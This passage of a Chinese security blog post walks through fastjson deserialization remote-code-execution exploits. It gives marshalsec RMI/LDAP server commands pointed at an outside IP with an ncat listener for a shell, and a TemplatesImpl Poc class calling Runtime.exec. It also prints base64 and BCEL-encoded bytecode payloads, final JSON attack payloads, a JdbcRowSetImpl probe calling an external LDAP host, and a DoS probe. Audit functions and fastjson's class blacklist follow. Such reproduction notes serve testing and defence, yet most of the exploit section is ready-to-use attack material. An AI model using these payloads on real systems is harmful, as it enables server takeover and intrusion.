它的JSONString（）方法可以将java的对象转换成json格式，同样通过parseObject方法可以将json数据转换成java的对象.</code></pre><h3 id="fastjson漏洞历史"><a href="#fastjson漏洞历史" class="headerlink" title="fastjson漏洞历史"></a>fastjson漏洞历史</h3><p><strong>fastjson-1.2.24</strong><br>(fastjson接受的JSON可以通过<code>@type</code>字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作)<br><strong>fastjson-1.248以下</strong><br>(从而导致checkAutoType在检测是否为黑名单的时候绕了过去，因为上一步将com.sun.rowset.JdbcRowSetImpl放入了mapping中，checkAutoType中使用TypeUtils.getClassFromMapping(typeName)去获取class不为空，从而绕过了黑名单检测)<br><strong>fastjson-1.2.60以下</strong><br>(在此版本以下，字符串中包含\x转义字符时可以造成dos漏洞)</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="本地测试环境"><a href="#本地测试环境" class="headerlink" title="本地测试环境"></a>本地测试环境</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210627-8213791a-3605-1.jpg" alt=""><br>    本地的版本java版本为1.8.0_181<br>   fastjson版本为1.2.24<br>   tomcat 版本为 7</p>
<p> 然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
<p><strong>安全版本</strong><br><code>JDK</code>（ 8u121, 7u131, 6u141 ）<br><code>RMI</code>(JDK 6u132, 7u122, or 8u113 )</p>
<h3 id="fastjson两种利用方式-出网或者不能出网"><a href="#fastjson两种利用方式-出网或者不能出网" class="headerlink" title="fastjson两种利用方式 - 出网或者不能出网"></a>fastjson两种利用方式 - 出网或者不能出网</h3><p><strong>1.服务器出网</strong><br>   使用<code>jndi</code>注入<br>-<code>ldap
-</code>rmi<br> ** 2.服务器不能出网**<br>   直接本地反序列化<br>-<code>BasicDataSource</code>(tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4)<br>-<code>TemplatesImpl</code></p>
<h4 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h4><p>  <code>jndi</code>利用，其中分为rmi或者ldap,使用ldap限制比rmi小</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rmi利用</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;#Poc&quot; 9999</span><br><span class="line"></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;40.73.6.221:8080&#x2F;#Poc&quot; 9999</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line">ncat –lvvp 9998</span><br><span class="line">Burp发送poc</span><br></pre></td></tr></table></figure>
<p><strong>图三是获取shell</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210628-82a86de0-3605-1.jpg" alt=""></p>
<h4 id="不能出网"><a href="#不能出网" class="headerlink" title="不能出网"></a>不能出网</h4><p><strong>1.直接反序列化-_bytecodes直接反序列化Poc</strong></p>
<pre><code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法而大部分的开发可能用用JSON.parse(input)就了事儿了，同时使用了parseObject和Feature.SupportNonPublicField设置的估计不多。所以说实际环境中挖掘fastjson的这个漏洞应该是可遇不可求</code></pre><blockquote>
<p>利用代码如下：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;poc.class_base64&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,&quot;_outputProperties&quot;:&#123;&#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>具体Poc.java代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Poc extends AbstractTranslet &#123;</span><br><span class="line">public Poc() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Poc t &#x3D; new Poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先编译poc得到字节码，然后用pyhton进行编码生成byte后的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">fin &#x3D; open(r&quot;Poc.class&quot;, &quot;rb&quot;)</span><br><span class="line">fout &#x3D; open(r&quot;en1.txt&quot;, &quot;w&quot;)</span><br><span class="line">s &#x3D; base64.encodestring(fin.read()).replace(&quot;\n&quot;, &quot;&quot;)</span><br><span class="line">fout.write(s)</span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Poc1.class进行base64并且要替换换行’\n’, 后代码如下</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALcG9jMTExLmphdmEMAAgACQcAIQwAIgAjAQAMdG91Y2ggL3RtcC8xDAAkACUBAAZQb2MxMTEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACQAEAAoADQALAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAADgABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAEQAMAAAABAABABEACQASABMAAgAKAAAAJQACAAEAAAAJuwAFWbcABlexAAAAAQALAAAACgACAAAAFAAIABUADAAAAAQAAQAUAAEAFQAAAAIAFg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>最终poc</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAIUG9jLmphdmEMAAgACQcAIQwAIgAjAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAJAAlAQADUG9jAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACwAAAA4AAwAAAAsABAAMAA0ADQAMAAAABAABAA0AAQAOAA8AAQAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAABEAAQAOABAAAgAKAAAAGQAAAAMAAAABsQAAAAEACwAAAAYAAQAAABYADAAAAAQAAQARAAkAEgATAAIACgAAACUAAgACAAAACbsABVm3AAZMsQAAAAEACwAAAAoAAgAAABkACAAaAAwAAAAEAAEAFAABABUAAAACABY&#x3D;&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,&quot;_outputProperties&quot;:&#123;&#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>


<p><strong>关键调用链如下</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210630-83b6d546-3605-1.jpg" alt=""></p>
<p><strong>命令执行如下</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210631-84d0a466-3605-1.jpg" alt=""></p>
<p><strong>2.直接反序列化-dbcp</strong><br>依赖<br><code>commons-dbcp.jar</code><br>org.apache.commons.dbcp.BasicDataSource<br>Spring在第三方依赖包中包含了两个数据源的实现类包，其一是Apache的DBCP.</p>
<p>依赖<code>tomcat-dbcp.jar</code>(tomcat部署自带)<br>org.apache.tomcat.dbcp.dbcp.BasicDataSource</p>
<p>运行Poc1得到<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210632-85132278-3605-1.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$adR$ddj$TA$Y$3d$93$a4$d9d$bbmMc$5bS$ffZ$b5$9az$d1A$f0F$ob$b1$8a$85$d4$96$s$u$d2$ab$c9fLGvg$c2$ecD$82$P$e4$bd7V$U$7c$A$lJ$fcv$8dI$c0$80$V$dce$e6$9b9$7b$ce$f7$bb$df$7f$7c$f9$G$e0$3en$fb$f0$b0$e6$e3$Sj$r$ac$a7$f6$b2$87$x$3e$e6$b0$e6$e1$wC$f1$a1$d2$ca$3db$c8$d7$b7_2$U$9e$98$aedXj$w$z_$M$e2$8e$b4m$d1$89$I$f1$9f$OC$d9w$ca$e8$c4$c35$86$b2$b3B$to$8c$8d$Z$3e$d4$9b$a1$89y2$d0$dc$d8$k$X$7d$R$9eJ$3e$U$91$d0$5ci$t$ad$W$R$l$s$91$L$f9$de$e1Ac$s9$8e$s$d4$ae$8b$f9$5e$fb$60w$a8$92$7d$82$843$f6$ef$a2DZ$r$o$f5$5eZ$de$g$jE$9a$ees$a1$bb$91$b4$8d$b4$3a$fbo$89$9e$fc$87$a0$k$aeSWc$a14$c3j$fd$a4$f9V$bc$T$9c$e2$f5x$cbY$a5$7b$Ze$83$fa$db2$D$h$cag$wmv$e9$c8$84$3b$v3$40$Je$P$9b$Bn$e0$sC$e0$cc$m$3c$dd$e0$$$ee$f3$7b$Bna$8b$e6F$5c$86$c7$e7$ad$cb$O$b4S$b1$e4$bb$9d$84$s$Y$bav$3a$c6H$3a$86j$96$9a2$7c$ffp$3ck$86$H$e7u$fc$db$d1$94$b6$3a$vv$K$adL$d0$e3_$c9P$f5$3d$e9$c6$97$95$fav$f3$PN$83$ba$u$87$92J$bdS$9f$d1$c4$v$e8$c8$9aP$sI$D$9b$f4$93$7bH$9f$CX$daH$e4$e0$d3m$87$y$p$bbx$f7$M$ec3r$cb$f9O$u$bc$faH$I$c3$7c$8a$pO$fb$3c$a9$C$y$d0$h$8c$3c$y$d0Z$c4$S$ed$a9$97Z$86$92f$o$yfn$x$Z$ed$c2$uXJ$cb$cf$a2$ad$8e$fdV$u$b3eTG$82$z$b29$b2$e5$af$98$7b$7d$86bs$o$f4$b3$P5$we$7d$y$beHk$85$ce9$ac$fe$E$i$98$ab$f0$f4$D$A$A</span><br></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210632-8558b478-3605-1.jpg" alt=""></p>
<p>最终poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&#123;&quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;: &#123;&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7d$91$cfN$C1$Q$c6$bf$c2$$$c5$ba$C$o$e2$3fD$b8$n$HI$bcJ$bc$YM$d0U$P$Q$8e$seidq$dd$dd$y$8b$f1$8d$3csQ$e3$c1$H$f0$a1$8c$b3$F5$5el$d2$99$ce7$9d_$a7$ed$c7$e7$db$3b$80C$d4$F$b2$d801$li$81Mlql$L$98$d8$e1$a8p$ec2d$da$ae$ef$c6$c7$M$e9$c6$7e$9f$c18$J$86$8a$no$bb$be$ba$9a$de$PT$d4$93$D$8f$94$a2$j8$d2$eb$cb$c8M$e2$85h$c4$pw$c2$c0$ed$89$a7Tx$c4$90m$3b$de$82$c7$u_$b3$c7$f2A$b6$3c$e9$df$b6$3a$7e$ac$a2h$g$c6jx$fa$e8$a80v$D$9f$wV$ba$b1t$ee$$e$a8$91$d4$j$83$e8$G$d3$c8Qgnr$84$d0$e8$83$84ca$J$82$a3j$a1$82$3d$86$ea$ffl$L5$I$GS$d73$U$7ew_$P$c6$ca$89$ffH$bdQ$a4$e4$90$$$d48O$5e$n$lF$ae$l$eb$cez$91t$U$ea$e0$f4$94$c9H$81$rm$90$5d$a6$a8E$9e$917$9b$_$603$9d$b6$c8f$b4H$97$pk$cd7$m$87$3c$f9$y$K$3f$c57$g$G$e4KH$bd$c2xB$f6$a2$f9$8c$ccL$8b$Z$3a$c5DZ$e3$caH$fe$d0$m$8dkU$d0$wG$a8o$bc$a0$dc$w$8a$U$ad$d1$e4Hu8J$G$r$d6uG$e5$_$H$X$vT$R$C$A$A&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&#123;&quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;: &#123;&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7d$91$cfN$C1$Q$c6$bf$c2$$$c5$ba$C$o$e2$3fD$b8$n$HI$bcJ$bc$YM$d0U$P$Q$8e$seidq$dd$dd$y$8b$f1$8d$3csQ$e3$c1$H$f0$a1$8c$b3$F5$5el$d2$99$ce7$9d_$a7$ed$c7$e7$db$3b$80C$d4$F$b2$d801$li$81Mlql$L$98$d8$e1$a8p$ec2d$da$ae$ef$c6$c7$M$e9$c6$7e$9f$c18$J$86$8a$no$bb$be$ba$9a$de$PT$d4$93$D$8f$94$a2$j8$d2$eb$cb$c8M$e2$85h$c4$pw$c2$c0$ed$89$a7Tx$c4$90m$3b$de$82$c7$u_$b3$c7$f2A$b6$3c$e9$df$b6$3a$7e$ac$a2h$g$c6jx$fa$e8$a80v$D$9f$wV$ba$b1t$ee$$e$a8$91$d4$j$83$e8$G$d3$c8Qgnr$84$d0$e8$83$84ca$J$82$a3j$a1$82$3d$86$ea$ffl$L5$I$GS$d73$U$7ew_$P$c6$ca$89$ffH$bdQ$a4$e4$90$$$d48O$5e$n$lF$ae$l$eb$cez$91t$U$ea$e0$f4$94$c9H$81$rm$90$5d$a6$a8E$9e$917$9b$_$603$9d$b6$c8f$b4H$97$pk$cd7$m$87$3c$f9$y$K$3f$c57$g$G$e4KH$bd$c2xB$f6$a2$f9$8c$ccL$8b$Z$3a$c5DZ$e3$caH$fe$d0$m$8dkU$d0$wG$a8o$bc$a0$dc$w$8a$U$ad$d1$e4Hu8J$G$r$d6uG$e5$_$H$X$vT$R$C$A$A&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="黑白盒测试方法"><a href="#黑白盒测试方法" class="headerlink" title="黑白盒测试方法"></a>黑白盒测试方法</h2><h3 id="利用链及版本"><a href="#利用链及版本" class="headerlink" title="利用链及版本"></a>利用链及版本</h3><table>
<thead>
<tr>
<th>Payload</th>
<th>PayloadType</th>
<th>Dependencies</th>
</tr>
</thead>
<tbody><tr>
<td>BasicDataSource</td>
<td>local</td>
<td>tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4</td>
</tr>
<tr>
<td>JdbcRowSetImpl</td>
<td>jndi</td>
<td>Fastjson 1.2.47及以下</td>
</tr>
<tr>
<td>TemplatesImp</td>
<td>local</td>
<td>need Feature.SupportNonPublicField</td>
</tr>
</tbody></table>
<h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>  1.目标站点如果报错的话一般使用不闭合{花括号或者多添加”双引号来进行测试</p>
<p>  2.fastjson与jackson区别，如果请求包中的 json 如下:<br>    {“name”:”S”, “age”:21}<br>    追加一个随机 key ,修改 json 为<br>    {“name”:”S”, “age”:21,”agsbdkjada__ss_d”:123}<br>    这里 fastjson 是不会报错的, Jackson 因为强制 key 与 javabean 属性对齐,只能 少不能多 key,<br>    所以会报错,服务器的响应包中多少会有异常回显</p>
<p>  3.dos检测 dos<br>    {“a:”\x  看返回时间</p>
<p>  4.如果是json字符串中name字段存在反序列化<br>    {“id”:”1”,”name”:”wangwei”}那么poc就是<br>    {“id”:”1”,”name”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”},”x”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://fatjaon.tuq75v.ceye.io”,”autoCommit”:true}}</p>
<p><strong>小tips</strong><br>1.在测试过程中发现只要回显比较慢，或者感觉卡顿都有可能是正在执行命令，所以比较慢<br>2.poc.java文件用低版本的java环境编译，因为java是向下兼容的，防止目标环境加载的时候运行报错，最好是jdk1.6</p>
<h3 id="白盒审计函数"><a href="#白盒审计函数" class="headerlink" title="白盒审计函数"></a>白盒审计函数</h3><p>   1.查看fastjson jar包是否小于1.2.48<br>    2.审查以下函数<br>    JSON.parseObject（）<br>    JSONObject.parseObject（）<br>    JSON.parseAarry（）</p>
<h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p><code>config.checkAutoType(typeName)</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5</a></p>
<p><strong>参考</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;FastjsonExploit</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shengqi158&#x2F;fastjson-remote-code-execute-poc</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;hac425&#x2F;p&#x2F;9800288.html</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;yaofeino1&#x2F;article&#x2F;details&#x2F;76377080</span><br><span class="line">https:&#x2F;&#x2F;blog.riskivy.com&#x2F;无损检测fastjson-dos漏洞以及盲区分fastjson与jackson组件&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;kingx.me&#x2F;Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>反编译</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
</search>
